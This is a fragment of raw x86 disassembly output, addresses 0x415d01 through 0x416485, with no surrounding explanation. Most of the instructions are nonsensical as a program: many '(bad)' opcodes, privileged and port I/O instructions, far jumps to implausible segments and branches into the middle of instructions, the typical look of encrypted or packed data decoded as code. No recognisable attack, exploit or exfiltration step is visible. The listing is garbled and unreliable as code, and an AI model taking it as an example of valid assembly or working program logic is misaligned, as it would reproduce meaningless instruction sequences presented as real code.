  415d01:	mov    ebx,0xe3bf19ae
  415d06:	ja     0x415cbb
  415d08:	sti    
  415d09:	test   DWORD PTR [edx+0x3a],0x519d955a
  415d10:	ja     0x415d67
  415d12:	lock sub al,0x56
  415d15:	pop    edx
  415d16:	stos   DWORD PTR es:[edi],eax
  415d17:	test   al,0xa2
  415d19:	mov    ds:0x174f983d,al
  415d1e:	loopne 0x415d1c
  415d20:	pop    ecx
  415d21:	mov    ebx,0xd43c3975
  415d26:	mov    WORD PTR ds:0x46c7e7f4,gs
  415d2c:	stc    
  415d2d:	pop    eax
  415d2e:	xlat   BYTE PTR ds:[ebx]
  415d2f:	scas   al,BYTE PTR es:[edi]
  415d30:	pop    ss
  415d31:	gs inc esi
  415d33:	adc    dl,BYTE PTR [ebp-0xf]
  415d36:	inc    eax
  415d37:	cli    
  415d38:	call   0x1728662a
  415d3d:	mov    ch,0x51
  415d3f:	retf   
  415d40:	loop   0x415d21
  415d42:	es in  eax,dx
  415d44:	cmp    eax,0xf65ab99f
  415d49:	mov    ah,0xa0
  415d4b:	sar    BYTE PTR [edi+0x7],cl
  415d4e:	dec    ebp
  415d4f:	sbb    DWORD PTR [esp+eax*1-0x11],edx
  415d53:	add    bh,BYTE PTR [eax+0x63]
  415d56:	je     0x415ceb
  415d58:	push   ebx
  415d59:	dec    edx
  415d5a:	inc    esp
  415d5b:	cmp    cl,BYTE PTR [esi]
  415d5d:	dec    ecx
  415d5e:	pop    esi
  415d5f:	xlat   BYTE PTR ds:[ebx]
  415d60:	jmp    0x4e16:0xfa8031bf
  415d67:	mov    eax,DWORD PTR [edx-0xfa99b34]
  415d6d:	mov    bh,0xc0
  415d6f:	xor    bl,BYTE PTR [esi]
  415d71:	jmp    0x415d45
  415d73:	loope  0x415db7
  415d75:	(bad)  
  415d76:	mov    BYTE PTR [ebp+eiz*4-0x2a2300f7],ah
  415d7d:	xor    ebx,DWORD PTR [ebp-0x3f]
  415d80:	stos   BYTE PTR es:[edi],al
  415d81:	inc    edi
  415d82:	xchg   esi,eax
  415d83:	mov    ebp,0x81fddf0e
  415d88:	push   ebx
  415d89:	jmp    0x4cd9:0xc6930184
  415d90:	stos   BYTE PTR es:[edi],al
  415d91:	jl     0x415e11
  415d93:	dec    esi
  415d94:	add    edi,DWORD PTR [eax]
  415d96:	test   BYTE PTR [eax],0xa9
  415d99:	cli    
  415d9a:	push   ebp
  415d9b:	jg     0x415da5
  415d9d:	rcr    BYTE PTR [esi],cl
  415d9f:	nop
  415da0:	mov    ebp,0x11d7b4dd
  415da5:	xor    ebp,DWORD PTR [eax-0x1ea173f2]
  415dab:	mov    dl,0xb3
  415dad:	lock in eax,0x80
  415db0:	jmp    0xf7be6c6c
  415db5:	xchg   edx,eax
  415db6:	sbb    bl,BYTE PTR [esi]
  415db8:	js     0x415dcc
  415dba:	cmp    ebp,eax
  415dbc:	mov    WORD PTR [ebx-0x42c0dba9],es
  415dc2:	pop    ebx
  415dc3:	rcl    BYTE PTR [esi-0x44],1
  415dc6:	cdq    
  415dc7:	jns    0x415e47
  415dc9:	inc    esp
  415dca:	sbb    al,0xa3
  415dcc:	sahf   
  415dcd:	out    0xbb,eax
  415dcf:	into   
  415dd0:	xchg   ebx,eax
  415dd1:	push   ecx
  415dd2:	addr16 jb 0x415e50
  415dd5:	mov    eax,ds:0x242cc86f
  415dda:	jb     0x415e1d
  415ddc:	mov    edi,ebp
  415dde:	shl    BYTE PTR [ebp+0x48beed25],cl
  415de4:	fs mov ebx,0x578e6dbd
  415dea:	aam    0x61
  415dec:	add    eax,0x9aefc7de
  415df1:	(bad)  
  415df2:	scas   al,BYTE PTR es:[edi]
  415df3:	fstp   TBYTE PTR [ecx-0x55]
  415df6:	into   
  415df7:	fadd   DWORD PTR fs:[esi]
  415dfa:	enter  0x5228,0xac
  415dfe:	add    al,0xf5
  415e00:	jnp    0x415e00
  415e02:	push   es
  415e03:	into   
  415e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e05:	out    dx,al
  415e06:	inc    edi
  415e07:	mov    bl,0xd0
  415e09:	fisubr DWORD PTR ds:0x5228c590
  415e0f:	mov    ebp,0x2418cdc9
  415e14:	pop    edx
  415e15:	cmp    al,0x89
  415e17:	push   ebp
  415e18:	sub    BYTE PTR [edx+0x7c994823],dh
  415e1e:	mov    bh,0x79
  415e20:	xchg   ebx,eax
  415e21:	jne    0x415df0
  415e23:	and    DWORD PTR [ecx+0x3fb9251e],esi
  415e29:	pop    esp
  415e2a:	repz int3 
  415e2c:	jecxz  0x415e64
  415e2e:	dec    edi
  415e2f:	neg    BYTE PTR [ebp+0x5e00b3fa]
  415e35:	push   cs
  415e36:	sub    DWORD PTR [edx-0x251cbae7],0x67
  415e3d:	je     0x415e51
  415e3f:	jns    0x415ebe
  415e41:	mov    dl,0xb0
  415e43:	in     al,0x2a
  415e45:	or     ebx,DWORD PTR [ecx]
  415e47:	js     0x415e73
  415e49:	sub    ebx,DWORD PTR [eax]
  415e4b:	test   eax,0x384948b5
  415e50:	sbb    DWORD PTR [ebp+0x2f],edx
  415e53:	lahf   
  415e54:	or     esi,eax
  415e56:	aad    0x86
  415e58:	rdmsr  
  415e5a:	xchg   ebx,eax
  415e5b:	std    
  415e5c:	sbb    eax,0x27ccbe03
  415e61:	enter  0xbd94,0xaa
  415e65:	fcom   DWORD PTR [ebp+0x57]
  415e68:	dec    eax
  415e69:	loop   0x415ee6
  415e6b:	push   ecx
  415e6c:	cmp    cl,0x35
  415e6f:	(bad)  
  415e70:	out    0xbd,al
  415e72:	(bad)  
  415e74:	enter  0x979c,0xb4
  415e78:	dec    ebx
  415e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7a:	pop    ds
  415e7b:	nop
  415e7c:	not    esi
  415e7e:	push   edx
  415e7f:	or     al,0x63
  415e81:	lods   eax,DWORD PTR ds:[esi]
  415e82:	leave  
  415e83:	jns    0x415ec1
  415e85:	div    DWORD PTR [eax-0x76fbfece]
  415e8b:	jnp    0x415e71
  415e8d:	fld    st(5)
  415e8f:	push   es
  415e90:	mov    ecx,0x3b619efb
  415e95:	sbb    DWORD PTR [edi+0x44],ebx
  415e98:	cwde   
  415e99:	loopne 0x415e2c
  415e9b:	xlat   BYTE PTR ds:[ebx]
  415e9c:	lods   eax,DWORD PTR ds:[esi]
  415e9d:	stos   DWORD PTR es:[edi],eax
  415e9e:	sbb    esi,DWORD PTR [edi]
  415ea0:	shl    ah,1
  415ea2:	outs   dx,DWORD PTR ds:[esi]
  415ea3:	(bad)  
  415ea4:	mul    BYTE PTR [esp+ebx*1-0x3b]
  415ea8:	lods   eax,DWORD PTR ds:[esi]
  415ea9:	mov    al,0x3b
  415eab:	or     bh,BYTE PTR [edi]
  415ead:	inc    ebx
  415eae:	and    DWORD PTR ds:0x23d1b0df,ebx
  415eb4:	mov    eax,ds:0x4523b9d2
  415eb9:	outs   dx,DWORD PTR ds:[esi]
  415eba:	mov    eax,ds:0x234500eb
  415ebf:	sbb    eax,0x566a7073
  415ec4:	mov    dh,dl
  415ec6:	sub    esi,DWORD PTR [edx+0x79]
  415ec9:	dec    ebx
  415eca:	ss inc ebp
  415ecc:	mov    edi,0x7dbd8c12
  415ed1:	fsub   QWORD PTR [ebp-0x50]
  415ed4:	icebp  
  415ed5:	aas    
  415ed6:	push   cs
  415ed7:	inc    ebp
  415ed8:	xor    al,0xdb
  415eda:	lock cmp BYTE PTR [edi],ch
  415edd:	push   eax
  415ede:	cmp    esp,edi
  415ee0:	adc    eax,0xfe6201
  415ee5:	inc    ebx
  415ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee7:	inc    ecx
  415ee8:	jb     0x415ec9
  415eea:	pushf  
  415eeb:	xor    cl,BYTE PTR [ebp-0x2a]
  415eee:	cmp    ecx,DWORD PTR [esi]
  415ef0:	outs   dx,BYTE PTR ds:[esi]
  415ef1:	(bad)  
  415ef2:	dec    BYTE PTR [edi-0x7aeb4e89]
  415ef8:	pop    ecx
  415ef9:	and    dl,BYTE PTR [ebx]
  415efb:	dec    esi
  415efc:	sbb    eax,0x55e9b6b7
  415f01:	mov    esp,0xf8c04e11
  415f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f07:	scas   eax,DWORD PTR es:[edi]
  415f08:	pop    ebx
  415f09:	inc    edi
  415f0a:	or     al,0x14
  415f0c:	pop    ecx
  415f0d:	xor    eax,0x5184d1eb
  415f12:	(bad)  [ebx]
  415f14:	sbb    al,0x74
  415f16:	into   
  415f17:	xchg   edx,eax
  415f18:	mov    dl,BYTE PTR [esi-0x52]
  415f1b:	iret   
  415f1c:	repnz retf 
  415f1e:	fst    DWORD PTR [esi+0x76]
  415f21:	add    al,0xca
  415f23:	adc    eax,0xb6d6f90c
  415f28:	mov    eax,ds:0xa0c46c93
  415f2d:	lods   al,BYTE PTR ds:[esi]
  415f2e:	stos   DWORD PTR es:[edi],eax
  415f2f:	loop   0x415eb3
  415f31:	and    al,0x35
  415f33:	in     al,0x93
  415f35:	jbe    0x415f1a
  415f37:	mov    cl,ch
  415f39:	clc    
  415f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f3b:	pop    ecx
  415f3c:	xchg   BYTE PTR [eax],bl
  415f3e:	arpl   WORD PTR [edi-0x2a],cx
  415f41:	(bad)  [ebx-0x28804ce8]
  415f47:	push   edx
  415f48:	or     eax,0x1bfa6e2a
  415f4d:	xor    al,0xf9
  415f4f:	lea    ebx,[edx-0x5f891839]
  415f55:	jl     0x415fcc
  415f57:	nop
  415f58:	(bad)  
  415f59:	cdq    
  415f5a:	clc    
  415f5b:	cmc    
  415f5c:	mov    dh,BYTE PTR [edi+0x23]
  415f5f:	(bad)  [ecx-0x7e58ba72]
  415f65:	hlt    
  415f66:	sbb    al,0x81
  415f68:	push   edx
  415f69:	push   ecx
  415f6a:	and    BYTE PTR [ecx+0x5d],dl
  415f6d:	sub    dh,0xb2
  415f70:	and    esp,DWORD PTR [esi-0xd]
  415f73:	dec    edx
  415f74:	mov    ebx,ebx
  415f76:	or     eax,0x1dc26c1f
  415f7b:	mov    bh,0x14
  415f7d:	push   ecx
  415f7e:	ja     0x415fee
  415f80:	scas   al,BYTE PTR es:[edi]
  415f81:	test   eax,0x9bd22c4d
  415f86:	sub    BYTE PTR cs:[esi],0xb8
  415f8a:	sbb    ebx,esp
  415f8c:	popa   
  415f8d:	stos   BYTE PTR es:[edi],al
  415f8e:	das    
  415f8f:	fdiv   DWORD PTR [edx]
  415f91:	(bad)  
  415f92:	and    DWORD PTR [ecx],edx
  415f94:	repz aas 
  415f96:	test   BYTE PTR [edx+0x77],bh
  415f99:	jecxz  0x415f57
  415f9b:	scas   al,BYTE PTR es:[edi]
  415f9c:	fidivr WORD PTR [edi-0x80ed400]
  415fa2:	cld    
  415fa3:	xor    DWORD PTR [esi-0x30],0x3077aaec
  415faa:	fstp   st(6)
  415fac:	inc    edx
  415fad:	iret   
  415fae:	pop    es
  415faf:	mov    ah,0x11
  415fb1:	fistp  WORD PTR [edx]
  415fb3:	xchg   DWORD PTR ds:0xec7e49be,eax
  415fb9:	ret    
  415fba:	xchg   BYTE PTR [esi],ch
  415fbc:	lds    esi,FWORD PTR [ebp+ebp*1+0x2443fb36]
  415fc3:	cmp    BYTE PTR [ecx],0xa9
  415fc6:	ins    BYTE PTR es:[edi],dx
  415fc7:	scas   al,BYTE PTR es:[edi]
  415fc8:	test   edx,edi
  415fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fcb:	mov    cl,0x2e
  415fcd:	in     al,dx
  415fce:	sbb    al,0x34
  415fd0:	xor    DWORD PTR [ebx+0x5c39b0bb],ebx
  415fd6:	les    edi,FWORD PTR ss:[esp+esi*8+0x76]
  415fdb:	adc    BYTE PTR [ebx],ah
  415fdd:	mov    al,BYTE PTR [ebx]
  415fdf:	pop    esp
  415fe0:	mov    al,ds:0xb70805eb
  415fe5:	sar    dl,1
  415fe7:	xlat   BYTE PTR ds:[ebx]
  415fe8:	push   esi
  415fe9:	push   ebp
  415fea:	mov    dl,0x79
  415fec:	inc    ebp
  415fed:	fs test al,0x68
  415ff0:	mov    al,0xf0
  415ff2:	test   DWORD PTR [ecx-0x395cdbc0],ecx
  415ff8:	mov    edx,0xc00760a7
  415ffd:	stos   DWORD PTR es:[edi],eax
  415ffe:	push   0xffffffeb
  416000:	pop    esi
  416001:	iret   
  416002:	mov    ebx,esi
  416004:	and    ebx,DWORD PTR [esp+ebx*2-0x2e]
  416008:	xlat   BYTE PTR gs:[ebx]
  41600a:	mov    eax,0x8f576cb7
  41600f:	xchg   DWORD PTR [eax-0x36],ecx
  416012:	bnd jb 0x416064
  416015:	cmc    
  416016:	imul   ecx,esp,0xe07809c1
  41601c:	nop
  41601d:	xor    esi,ecx
  41601f:	repnz test DWORD PTR ds:0xad9eb5f9,ecx
  416026:	push   ecx
  416027:	dec    ebx
  416028:	cmp    bl,BYTE PTR [ebp+0x187f1cf1]
  41602e:	aas    
  41602f:	sahf   
  416030:	shl    DWORD PTR [ecx+0x16145db1],1
  416036:	add    ch,ch
  416038:	iret   
  416039:	adc    al,BYTE PTR [ecx-0x5d45b1bb]
  41603f:	inc    edi
  416040:	loopne 0x41607d
  416042:	jl     0x415fed
  416044:	add    BYTE PTR [ebp-0x5],0xae
  416048:	enter  0x624d,0x93
  41604c:	pop    edi
  41604d:	daa    
  41604e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41604f:	and    ch,BYTE PTR [esi]
  416051:	scas   eax,DWORD PTR es:[edi]
  416052:	mov    al,0x8e
  416054:	(bad)  
  416055:	fsubr  DWORD PTR [edx]
  416057:	adc    al,0xbf
  416059:	popa   
  41605a:	pop    esp
  41605b:	out    dx,al
  41605c:	js     0x41605a
  41605e:	and    ch,BYTE PTR [ebx]
  416060:	fcom   QWORD PTR [ecx]
  416062:	mov    bl,0x5b
  416064:	les    esi,FWORD PTR ds:0xfd9aafd0
  41606a:	data16 js 0x416071
  41606d:	bound  ebp,QWORD PTR [eax+0x39]
  416070:	cs ret 0x5d7f
  416074:	mov    eax,ds:0x77d5d5eb
  416079:	aad    0x36
  41607b:	mov    es,WORD PTR [di]
  41607e:	push   ss
  41607f:	xor    BYTE PTR [esi+0x4c49d28b],0x10
  416086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416087:	daa    
  416088:	push   ebp
  416089:	mov    ebp,eax
  41608b:	dec    DWORD PTR [ebx-0x5e0258ac]
  416091:	dec    cl
  416093:	sub    dl,BYTE PTR [esp+edx*8-0x54]
  416097:	mov    ch,BYTE PTR [ecx-0x3fd48389]
  41609d:	int    0x4a
  41609f:	imul   edi,edi,0xf63a0a6b
  4160a5:	dec    eax
  4160a6:	mov    ebp,0xde480866
  4160ab:	push   ss
  4160ac:	aas    
  4160ad:	push   eax
  4160ae:	pop    ebx
  4160af:	sti    
  4160b0:	popa   
  4160b1:	inc    ebp
  4160b2:	dec    ebp
  4160b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b4:	sbb    eax,DWORD PTR [ecx]
  4160b6:	test   eax,0x22d061af
  4160bb:	push   esp
  4160bc:	sub    BYTE PTR [eiz*4-0x30f3df3a],dh
  4160c3:	dec    esp
  4160c4:	cmp    dl,BYTE PTR [ebp+0x3609e3a5]
  4160ca:	clc    
  4160cb:	ret    
  4160cc:	fisub  WORD PTR [ecx]
  4160ce:	arpl   WORD PTR [ecx],bx
  4160d0:	hlt    
  4160d1:	fwait
  4160d2:	jmp    0x8d35514
  4160d7:	nop
  4160d8:	pop    ebp
  4160d9:	mov    bl,0x3
  4160db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160dc:	and    eax,edi
  4160de:	call   0x30e4fc52
  4160e3:	mov    ah,0xa6
  4160e5:	dec    ebx
  4160e6:	ins    DWORD PTR es:[edi],dx
  4160e7:	mov    cs,WORD PTR [eax]
  4160e9:	sub    al,0x72
  4160eb:	lods   eax,DWORD PTR ds:[esi]
  4160ec:	sub    esi,edi
  4160ee:	adc    BYTE PTR [ebp+0x1892dc17],0x26
  4160f5:	fidivr DWORD PTR [edi]
  4160f7:	and    esp,DWORD PTR [ebp+0x47]
  4160fa:	and    DWORD PTR [ebp-0x1a],esi
  4160fd:	inc    ebx
  4160fe:	das    
  4160ff:	lds    ebp,FWORD PTR [ebp+0x7d]
  416102:	mov    BYTE PTR [edx],dl
  416104:	inc    ebp
  416105:	sti    
  416106:	jae    0x41617d
  416108:	mov    es,WORD PTR [ebx-0x798c4ad4]
  41610e:	pop    edi
  41610f:	iret   
  416110:	sbb    BYTE PTR [edi],0x84
  416113:	das    
  416114:	or     al,0xbd
  416116:	test   DWORD PTR [ebx-0x6e],edi
  416119:	jo     0x4160c4
  41611b:	xor    eax,0x3bbf3135
  416120:	retf   
  416121:	cmp    DWORD PTR [eax+0x40],edi
  416124:	jb     0x4160b8
  416126:	cmp    BYTE PTR [ebp-0xdca6678],0x9f
  41612d:	(bad)  
  41612e:	fadd   DWORD PTR [edi-0x80]
  416131:	gs cld 
  416133:	push   eax
  416134:	jp     0x41611d
  416136:	push   cs
  416137:	jo     0x416124
  416139:	lods   eax,DWORD PTR ds:[esi]
  41613a:	ficom  WORD PTR [ebp+0x3bdf0152]
  416140:	dec    eax
  416141:	mov    BYTE PTR [edi+0x52fca8eb],bh
  416147:	inc    DWORD PTR [edx+eiz*4-0x75e504f6]
  41614e:	pop    ds
  41614f:	mov    ebx,0x28645f1b
  416154:	pop    edx
  416155:	outs   dx,BYTE PTR ds:[esi]
  416156:	std    
  416157:	std    
  416158:	pusha  
  416159:	mov    eax,0xf4455e20
  41615e:	dec    ebx
  41615f:	and    al,BYTE PTR [esi]
  416161:	clc    
  416162:	xor    al,0x81
  416164:	xchg   edx,eax
  416165:	sbb    eax,0x99bdc183
  41616a:	shr    BYTE PTR [eax-0x44],0x77
  41616e:	pusha  
  41616f:	into   
  416170:	push   edi
  416171:	aas    
  416172:	jno    0x4161c1
  416174:	ss sbb esi,ebx
  416177:	mov    edi,DWORD PTR [ecx]
  416179:	add    eax,0x5ff6e0d0
  41617e:	cmp    BYTE PTR [edi-0x29],dh
  416181:	gs jbe 0x4161f7
  416184:	fsub   QWORD PTR [ebx+0x7977c6dc]
  41618a:	pop    esp
  41618b:	(bad)  
  41618c:	cmp    al,0xea
  41618e:	mov    ah,0x6f
  416190:	shl    DWORD PTR [edx+0x39],1
  416193:	xor    edx,esp
  416195:	jns    0x41612a
  416197:	(bad)  
  416198:	cmp    DWORD PTR [ebp+0x16],ebx
  41619b:	popf   
  41619c:	out    dx,eax
  41619d:	dec    edx
  41619e:	ins    DWORD PTR es:[edi],dx
  41619f:	cmc    
  4161a0:	addr16 xchg ecx,eax
  4161a2:	ss jo  0x41620a
  4161a5:	imul   esp,DWORD PTR [edx],0x161ab29c
  4161ab:	inc    edi
  4161ac:	or     DWORD PTR [edi+eax*1],ebx
  4161af:	cmovnp esi,ecx
  4161b2:	pop    ebp
  4161b3:	ds ret 0xa431
  4161b7:	test   eax,0x14e38277
  4161bc:	xor    DWORD PTR [ebx+edi*4-0x58540368],edx
  4161c3:	add    DWORD PTR [edi-0x17],edx
  4161c6:	push   es
  4161c7:	pop    ebp
  4161c8:	loope  0x416196
  4161ca:	(bad)  [eax-0x2f]
  4161cd:	mov    bl,BYTE PTR [ebp-0x51]
  4161d0:	sar    DWORD PTR [edi],1
  4161d2:	into   
  4161d3:	xchg   esp,eax
  4161d4:	ins    BYTE PTR es:[edi],dx
  4161d5:	mov    eax,ds:0xabb11839
  4161da:	icebp  
  4161db:	add    eax,edi
  4161dd:	push   edx
  4161de:	mov    dh,BYTE PTR [ebp+eax*2-0x59c41907]
  4161e5:	and    DWORD PTR [edx],edx
  4161e7:	push   ecx
  4161e8:	add    edi,ebx
  4161ea:	gs das 
  4161ec:	popa   
  4161ed:	not    ecx
  4161ef:	add    BYTE PTR [edx],bh
  4161f1:	stos   DWORD PTR es:[edi],eax
  4161f2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161f4:	inc    edi
  4161f5:	clc    
  4161f6:	stos   BYTE PTR es:[edi],al
  4161f7:	xor    eax,0xd711c953
  4161fc:	lods   al,BYTE PTR ds:[esi]
  4161fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161fe:	rol    al,0x58
  416201:	dec    esp
  416202:	test   edx,ebp
  416204:	aam    0xb3
  416206:	and    BYTE PTR [esi+ebp*4+0x6540b6dc],al
  41620d:	in     al,dx
  41620e:	das    
  41620f:	jg     0x416220
  416211:	xor    eax,0xdb738db5
  416216:	mov    ah,0xef
  416218:	into   
  416219:	stos   DWORD PTR es:[edi],eax
  41621a:	jo     0x4161e4
  41621c:	int3   
  41621d:	repnz adc edx,ebx
  416220:	scas   al,BYTE PTR es:[edi]
  416221:	jbe    0x416201
  416223:	push   cs
  416224:	loope  0x41622a
  416226:	sbb    DWORD PTR [esi+0x524c7281],ebx
  41622c:	mov    eax,ds:0x3f118615
  416231:	jg     0x4162a5
  416233:	mov    al,ds:0xc004b592
  416238:	cmp    bh,BYTE PTR ds:0x23584dff
  41623e:	stos   DWORD PTR es:[edi],eax
  41623f:	inc    edi
  416240:	lea    ebp,[esi-0x3f514ef3]
  416246:	add    al,0xc5
  416248:	imul   esp,DWORD PTR [eax+0x78],0xbe2cb003
  41624f:	dec    esp
  416250:	xchg   DWORD PTR [ecx],ebx
  416252:	loope  0x41620b
  416254:	cmp    ah,bl
  416256:	rol    DWORD PTR [esi],0x3b
  416259:	retf   
  41625a:	add    al,0xfc
  41625c:	sub    esi,DWORD PTR [eax]
  41625e:	sbb    eax,0x150bd502
  416263:	bound  edi,QWORD PTR [eax+0x32]
  416266:	lahf   
  416267:	dec    ebp
  416268:	sbb    DWORD PTR [edi-0x722a437a],esp
  41626e:	div    esp
  416270:	dec    ebx
  416271:	xchg   ecx,eax
  416272:	xchg   ebx,eax
  416273:	add    al,0xa8
  416275:	retf   
  416276:	repnz and esp,edx
  416279:	push   es
  41627a:	or     ch,BYTE PTR [ebx]
  41627c:	dec    edx
  41627d:	pop    ebx
  41627e:	sbb    eax,DWORD PTR [ebx+0x33]
  416281:	sbb    al,0xaa
  416283:	mov    ebp,0x14f7c21d
  416288:	mov    ch,0xe3
  41628a:	test   DWORD PTR ds:0x1e469078,esi
  416290:	gs sti 
  416292:	or     BYTE PTR [edx-0x2d],dl
  416295:	adc    dl,dh
  416297:	xor    BYTE PTR [edx+0x4149b901],0xbb
  41629e:	adc    bl,BYTE PTR [eax]
  4162a0:	retf   
  4162a1:	push   0x733304f3
  4162a6:	ror    BYTE PTR [esi+0x6a],0xa0
  4162aa:	aam    0xe6
  4162ac:	push   0xffffff85
  4162ae:	xchg   DWORD PTR [ecx],eax
  4162b0:	aam    0x72
  4162b2:	mov    esp,0xd9e6c007
  4162b7:	ins    DWORD PTR es:[edi],dx
  4162b8:	dec    ebp
  4162b9:	mov    ebx,DWORD PTR [eax+ebx*8]
  4162bc:	fadd   DWORD PTR [edi-0x5b40c23d]
  4162c2:	loop   0x4162c1
  4162c4:	cmp    eax,0xe7cbd0
  4162c9:	in     al,dx
  4162ca:	inc    ebp
  4162cb:	or     eax,0x5eb47e5
  4162d0:	repnz retf 0x4c13
  4162d4:	jne    0x4162bb
  4162d6:	outs   dx,BYTE PTR ds:[esi]
  4162d7:	in     al,dx
  4162d8:	cmc    
  4162d9:	cmp    eax,DWORD PTR [ebp-0x1b8b9beb]
  4162df:	mov    ?,WORD PTR [edx-0x7b]
  4162e2:	mov    edi,0x545897eb
  4162e7:	cdq    
  4162e8:	jae    0x416304
  4162ea:	xor    eax,esp
  4162ec:	push   cs
  4162ed:	mov    ah,0xfc
  4162ef:	hlt    
  4162f0:	inc    ebx
  4162f1:	aad    0xc4
  4162f3:	pop    esp
  4162f4:	dec    edi
  4162f5:	sbb    esp,esi
  4162f7:	gs inc edi
  4162f9:	inc    esi
  4162fa:	ds icebp 
  4162fc:	gs push esi
  4162fe:	mov    BYTE PTR [ecx+0x7cb86bf9],ch
  416304:	aas    
  416305:	push   es
  416306:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416308:	outs   dx,DWORD PTR ds:[esi]
  416309:	call   0x7586fd0
  41630e:	pop    edx
  41630f:	mov    bh,0x11
  416311:	mov    ebx,eax
  416313:	add    eax,esp
  416315:	(bad)  
  416316:	repnz rcr BYTE PTR [ebx-0xb81fe7e],cl
  41631d:	pop    ebp
  41631e:	sub    al,0xcc
  416320:	and    BYTE PTR ds:[edi],ch
  416323:	mov    ebp,0xeb7fd221
  416328:	mov    ch,0x6f
  41632b:	(bad)  [ebp-0x2e]
  41632e:	(bad)  
  41632f:	pushf  
  416330:	adc    DWORD PTR [ebp-0x52ac8aa7],edi
  416336:	fisttp WORD PTR [eax+0x68]
  416339:	push   0xffffffa9
  41633b:	and    DWORD PTR [esp+edi*1-0x69],ebp
  41633f:	inc    edi
  416340:	stos   BYTE PTR es:[edi],al
  416341:	imul   esi,DWORD PTR [eax],0x65ca6ce3
  416347:	sbb    al,0x20
  416349:	(bad)
  41634d:	push   ss
  41634e:	inc    ebx
  41634f:	popa   
  416350:	or     dh,cl
  416352:	aam    0x20
  416354:	or     ebx,DWORD PTR [esi-0x60]
  416357:	or     al,dl
  416359:	or     DWORD PTR [ecx+ebx*2-0x589f764c],0xee586255
  416364:	neg    DWORD PTR [esp+esi*8-0x80]
  416368:	aaa    
  416369:	cmp    edi,ebx
  41636b:	mov    ah,0xa1
  41636d:	fs mov ch,0xf0
  416370:	nop
  416371:	push   ebx
  416372:	add    esp,DWORD PTR [esi+0x2ebaac49]
  416378:	rcl    DWORD PTR [edi],0x31
  41637b:	stos   DWORD PTR es:[edi],eax
  41637c:	cmp    al,0xf7
  41637e:	imul   esp,DWORD PTR [esi],0x74
  416381:	adc    ebp,DWORD PTR [ecx]
  416383:	jmp    0x41635e
  416385:	mov    ds:0x42cf2954,eax
  41638a:	arpl   bx,sp
  41638c:	adc    DWORD PTR [ebx],0x460fd6d0
  416392:	sub    DWORD PTR [edi-0x7b3a54c8],ecx
  416398:	and    BYTE PTR ds:0x88b79a8b,al
  41639e:	push   ds
  41639f:	not    BYTE PTR [edi]
  4163a1:	mov    esi,0x56dd2066
  4163a6:	mov    esp,0xd2dbacef
  4163ab:	jecxz  0x4163ba
  4163ad:	sub    eax,esi
  4163af:	fwait
  4163b0:	adc    ebx,DWORD PTR [ebx]
  4163b2:	push   ebp
  4163b3:	sub    dl,al
  4163b5:	cwde   
  4163b6:	push   esp
  4163b7:	call   esp
  4163b9:	test   DWORD PTR [ecx],edi
  4163bb:	push   ds
  4163bc:	cmp    ch,BYTE PTR [ebx]
  4163be:	bound  edi,QWORD PTR [ebp+0x755cebf0]
  4163c4:	fsubp  st(7),st
  4163c6:	bnd jmp 0x416437
  4163c9:	sub    eax,0x4884eac4
  4163ce:	adc    eax,ecx
  4163d0:	jle    0x416371
  4163d2:	mov    al,ds:0xda5e5cc7
  4163d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163d8:	dec    esi
  4163d9:	cmp    BYTE PTR [esi+0x39],0xc6
  4163dd:	pop    edx
  4163de:	fadd   st,st(6)
  4163e0:	xor    dl,bl
  4163e2:	jle    0x4163f1
  4163e4:	sbb    eax,0xe6bdc92f
  4163e9:	cmp    BYTE PTR [edi+0x19],0xbc
  4163ed:	add    DWORD PTR [esi+0x60fec999],edi
  4163f3:	(bad)  
  4163f5:	mov    ecx,0x13ab175a
  4163fa:	or     DWORD PTR [ebx+0x7d56ab60],ebp
  416400:	clc    
  416401:	mov    BYTE PTR [eax+edx*4+0x7ef8f216],0x93
  416409:	test   DWORD PTR [ebx-0x2c19b421],edi
  41640f:	or     al,0x9e
  416411:	je     0x41644b
  416413:	je     0x4163ff
  416415:	fidiv  DWORD PTR [eax+edx*1-0x12]
  416419:	fwait
  41641a:	es out 0x87,eax
  41641d:	xor    dl,BYTE PTR [ecx-0x5e690ce]
  416423:	pop    ebp
  416424:	jbe    0x4163da
  416426:	mov    bh,0xfc
  416428:	push   ebp
  416429:	pop    ebp
  41642a:	sti    
  41642b:	leave  
  41642c:	pusha  
  41642d:	or     DWORD PTR [ebx-0x46],esp
  416430:	mov    eax,ds:0xdf04efac
  416435:	lea    esp,[ebp-0x3cdc01ed]
  41643b:	or     ebx,DWORD PTR [edx-0x5a]
  41643e:	popf   
  41643f:	cld    
  416440:	push   ecx
  416441:	retf   
  416442:	mov    edx,0xea89eccb
  416447:	sbb    bl,BYTE PTR [edi]
  416449:	adc    al,0x32
  41644b:	lods   eax,DWORD PTR ds:[esi]
  41644c:	or     al,0x69
  41644e:	rcl    dh,1
  416450:	xor    BYTE PTR [esi],bl
  416452:	rol    DWORD PTR [edi+edx*2-0x656f65bf],0xc9
  41645a:	pop    ebp
  41645b:	outs   dx,DWORD PTR ds:[esi]
  41645c:	ins    DWORD PTR es:[edi],dx
  41645d:	sahf   
  41645e:	xor    DWORD PTR [edi],ebx
  416460:	ror    DWORD PTR [ecx-0x7a],0x34
  416464:	sbb    eax,0x4ecb9870
  416469:	lea    eax,[edx]
  41646b:	adc    DWORD PTR [esi],ebx
  41646d:	mov    esi,0xee7595b0
  416472:	pop    edi
  416473:	mov    ds,WORD PTR [eax-0x39]
  416476:	retf   
  416477:	adc    eax,0xe0046523
  41647c:	js     0x416436
  41647e:	outs   dx,DWORD PTR ds:[esi]
  41647f:	in     al,dx
  416480:	test   cl,cl
  416482:	cs push edi
  416484:	xchg   esp,eax
  416485:	push   esi
